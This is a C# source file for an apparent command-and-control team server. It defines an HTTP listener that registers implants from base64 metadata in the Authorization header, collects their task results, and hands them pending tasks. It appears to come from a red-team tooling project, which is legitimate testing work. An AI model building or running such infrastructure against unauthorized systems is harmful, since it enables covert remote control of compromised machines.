using Microsoft.AspNetCore.Mvc;
using System.Text;
using Newtonsoft.Json;
using TeamServer.Models.Agents;
using TeamServer.Services;

namespace TeamServer.Models.Listeners
{
    [Controller]
    public class HttpListenerController : ControllerBase
    {
        private readonly IAgentService _agent;

        public HttpListenerController(IAgentService agent)
        {
            _agent = agent;
        }

        public async Task<IActionResult> HandleImplant()
        {
            var metadata = ExtractMetadata(HttpContext.Request.Headers);
            if (metadata == null) return NotFound();

            var agent = _agent.GetAgent(metadata.Id);
            if(agent == null)
            {
                agent = new Agent(metadata);
                _agent.AddAgent(agent);
            }
            agent.CheckIn();

            if(HttpContext.Request.Method == "POST")
            {
                string json;
                using (var sr = new StreamReader(HttpContext.Request.Body))
                {
                    json = await sr.ReadToEndAsync();
                }

                var results = JsonConvert.DeserializeObject<IEnumerable<AgentTaskResult>>(json);
                agent.AddTaskResults(results);
            }

            var tasks = agent.GetPendingTasks();
            return Ok(tasks);
        }

        private AgentMetadata ExtractMetadata(IHeaderDictionary headers)
        {
            if (!headers.TryGetValue("Authorization", out var encodedMetadata))
            {
                return null;
            }

            // Authorization: Bearer <base64>
            encodedMetadata = encodedMetadata.ToString().Remove(0, 7);

            var json = Encoding.UTF8.GetString(Convert.FromBase64String(encodedMetadata));
            return JsonConvert.DeserializeObject<AgentMetadata>(json); 
        }
    }
}
